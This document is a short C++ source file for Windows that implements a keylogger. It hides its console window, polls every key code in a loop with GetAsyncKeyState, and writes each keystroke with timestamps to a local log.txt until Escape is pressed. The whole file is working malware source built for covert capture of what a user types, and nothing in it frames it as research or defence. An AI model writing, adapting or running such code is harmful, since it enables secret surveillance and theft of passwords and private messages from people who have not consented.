#include <iostream>
#include <fstream> //file stream
#include <filesystem>
#include <conio.h> // this is for _getch()
#include <ctime>
#include <windows.h> //windows
#include <iomanip> //put_time

using namespace std;



void HideConsole() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
}

void MinimizeConsole() {
    ShowWindow(GetConsoleWindow(), SW_MINIMIZE);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
    HideConsole();

    MinimizeConsole();

    char key;
    time_t currTime = time(0);
    string time_str = ctime(&currTime);
    tm* ltm = localtime(&currTime);

    ofstream logFile("log.txt");

    logFile << "[" << put_time(ltm, "%Y-%m-%d %H:%M:%S") << "]: ";

    while (true) {
        // Check through possible key codes
        for(int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                // Check for ESC key
                if (key == VK_ESCAPE) {
                    logFile.close();
                    return 0;
                }
                
                // Check for Enter key
                if (key == VK_RETURN) {
                    currTime = time(0);
                    ltm = localtime(&currTime);
                    logFile << "\n[" << put_time(ltm, "%Y-%m-%d %H:%M:%S") << "]: ";
                } else {
                    logFile << char(key);
                }
                logFile.flush(); // Ensure writing to file
            }
        }
        Sleep(10); // Reduce CPU usage
    }
    
    return 0;
}
 